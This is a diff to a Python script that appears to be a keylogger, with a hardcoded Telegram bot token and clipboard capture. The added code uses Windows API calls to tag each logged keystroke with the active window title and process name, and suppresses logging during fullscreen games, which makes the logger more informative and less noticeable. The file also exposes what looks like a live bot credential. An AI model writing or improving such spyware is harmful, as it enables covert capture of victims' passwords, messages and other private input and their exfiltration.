@@ -12,6 +12,8 @@ import re
 import sys
 import subprocess
 import html
+import ctypes
+from ctypes import wintypes
 
 # Telegram Monitoring configuration
 BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
@@ -693,11 +695,88 @@ def check_clipboard_async():
         except Exception as e:
             log_message(f"Error saving clipboard content to buffer: {e}")
 
+last_window_info = ""
+
+def get_active_window_info():
+    try:
+        user32 = ctypes.windll.user32
+        kernel32 = ctypes.windll.kernel32
+        shell32 = ctypes.windll.shell32
+        
+        hwnd = user32.GetForegroundWindow()
+        if not hwnd:
+            return "", "", False
+        
+        # Get Window Title
+        length = user32.GetWindowTextLengthW(hwnd)
+        if length > 0:
+            title_buff = ctypes.create_unicode_buffer(length + 1)
+            user32.GetWindowTextW(hwnd, title_buff, length + 1)
+            title = title_buff.value.strip()
+        else:
+            title = ""
+            
+        # Get Process Name
+        pid = ctypes.c_ulong()
+        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+        proc_name = ""
+        if pid.value:
+            h_proc = kernel32.OpenProcess(0x1000 | 0x0400, False, pid.value) # PROCESS_QUERY_LIMITED_INFORMATION
+            if h_proc:
+                name_buff = ctypes.create_unicode_buffer(1024)
+                size = ctypes.c_ulong(1024)
+                if kernel32.QueryFullProcessImageNameW(h_proc, 0, name_buff, ctypes.byref(size)):
+                    proc_name = os.path.basename(name_buff.value)
+                kernel32.CloseHandle(h_proc)
+                
+        # Check if Fullscreen Game / D3D Fullscreen / Presentation Mode
+        is_game = False
+        try:
+            pstate = ctypes.c_int()
+            if shell32.SHQueryUserNotificationState(ctypes.byref(pstate)) == 0:
+                # 2 = QUNS_RUNNING_D3D_FULL_SCREEN, 3 = QUNS_PRESENTATION_MODE
+                if pstate.value in (2, 3):
+                    is_game = True
+        except:
+            pass
+            
+        if not is_game:
+            try:
+                class RECT(ctypes.Structure):
+                    _fields_ = [('left', ctypes.c_long), ('top', ctypes.c_long),
+                                ('right', ctypes.c_long), ('bottom', ctypes.c_long)]
+                rect = RECT()
+                user32.GetWindowRect(hwnd, ctypes.byref(rect))
+                screen_w = user32.GetSystemMetrics(0) # SM_CXSCREEN
+                screen_h = user32.GetSystemMetrics(1) # SM_CYSCREEN
+                w = rect.right - rect.left
+                h = rect.bottom - rect.top
+                style = user32.GetWindowLongW(hwnd, -16) # GWL_STYLE
+                WS_CAPTION = 0x00C00000
+                
+                # If window fills screen and has no standard caption/titlebar, and is not a system shell
+                if w >= screen_w and h >= screen_h and not (style & WS_CAPTION):
+                    ignored_procs = ["explorer.exe", "progman", "searchhost.exe", "shellexperiencehost.exe", "startmenuexperiencehost.exe", ""]
+                    if proc_name.lower() not in ignored_procs:
+                        is_game = True
+            except:
+                pass
+                
+        return proc_name, title, is_game
+    except:
+        return "", "", False
+
 def on_press(key):
     if IS_PAUSED:
         return
-    global last_clipboard
+    global last_clipboard, last_window_info
     try:
+        proc_name, title, is_game = get_active_window_info()
+        
+        # If currently playing a game, ignore and do not log keypresses
+        if is_game:
+            return
+
         if hasattr(key, 'char') and key.char is not None:
             key_str = key.char
         else:
@@ -766,8 +845,17 @@ def on_press(key):
             if code < 32 and key_str not in ['\n', '\r', '\t']:
                 return
             
+        # Add active window/app header when user switches windows
+        header_text = ""
+        current_win = f"[{proc_name} | {title}]" if (proc_name or title) else ""
+        if current_win and current_win != last_window_info:
+            last_window_info = current_win
+            header_text = f"\n\n[ {current_win} ]\n"
+
         buffer_path = os.path.join(STORAGE, "keylog_buffer.txt")
         with open(buffer_path, "a", encoding="utf-8") as f:
+            if header_text:
+                f.write(header_text)
             f.write(key_str)
     except Exception as e:
         pass
